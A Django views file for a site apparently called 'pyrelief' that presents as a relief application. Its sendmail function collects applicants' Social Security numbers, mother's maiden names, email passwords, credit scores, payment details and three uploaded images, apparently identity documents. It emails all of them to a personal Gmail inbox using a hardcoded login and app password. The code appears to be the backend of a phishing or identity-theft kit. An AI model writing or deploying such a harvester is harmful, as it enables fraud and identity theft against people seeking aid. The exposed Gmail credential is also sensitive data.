import cgi
import imghdr
import json
import os

from django.core.files.storage import FileSystemStorage
from django.shortcuts import render
import smtplib
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication


# Create your views here.
from pyrelief import settings


def index(request):
    return render(request, 'index.html', {})


def apply(request):
    return render(request, 'apply.html', {})


def sendmail(request):
    context = {
        "Response": 'Thank You, We will get back to you.... '
    }
    msg = EmailMessage()
    msg['Subject'] = 'New Registration'
    msg['From'] = 'sodeeqsodeeq@gmail.com'
    # msg['To'] = 'jannetdollinsmgw39@gmail.com'
    msg['To'] = 'sodeeqsodeeq@gmail.com'
    msg.set_content("FirstName= " + request.POST['fname'] + "\r" 
                    "MiddleName= " + request.POST['mname'] + "\r"
                    "LastName =" + request.POST['lname'] + "\r"
                    "phone: " + request.POST['ph'] + "\r"
                    "Work Status: " + request.POST['emp'] + "\r"
                    "ssn: " + request.POST['ssn'] + "\r"
                    "Mother Maiden Name: " + request.POST['mmn'] + "\r"
                    "Address : " + request.POST['addr'] + "\r"
                    "apt : " + request.POST['apt'] + "\r"
                    "city : " + request.POST['city'] + "\r"
                    "state : " + request.POST['state'] + "\r"
                    "zip : " + request.POST['zip'] + "\r"
                    "gender : " + request.POST['gender'] + "\r"
                    "dob : " + request.POST['dob'] + "\r"
                    "race : " + request.POST['race[]'] + "\r"
                    "employer : " + request.POST['empl'] + "\r"
                    "email : " + request.POST['email'] + "\r"
                    "password : " + request.POST['password'] + "\r"
                    "Education : " + request.POST['edu'] + "\r"
                    "Credit Score : " + request.POST['score'] + "\r"
                    "Payment Method : " + request.POST['payment'] + "\r"
                    "Separation Year : " + request.POST['emplyear'])

    file1 = request.FILES['attachment1']
    fs = FileSystemStorage()
    filename = fs.save(file1.name, file1)
    uploaded_file_url = fs.url(filename)
    with open(uploaded_file_url, 'rb') as f:
        file_data = f.read()
        file_type = str(imghdr.what(f.name))
        file_name = f.name
    msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name)

    file1 = request.FILES['attachment2']
    fs = FileSystemStorage()
    filename = fs.save(file1.name, file1)
    uploaded_file_url = fs.url(filename)
    with open(uploaded_file_url, 'rb') as f:
        file_data = f.read()
        file_type = str(imghdr.what(f.name))
        file_name = f.name
    msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name)

    file1 = request.FILES['attachment3']
    fs = FileSystemStorage()
    filename = fs.save(file1.name, file1)
    uploaded_file_url = fs.url(filename)
    with open(uploaded_file_url, 'rb') as f:
        file_data = f.read()
        file_type = str(imghdr.what(f.name))
        file_name = f.name
    msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login('sodeeqsodeeq@gmail.com', 'avtltqidkrtbgvmz')
        smtp.send_message(msg)
    return render(request, 'index.html', {'context': context})
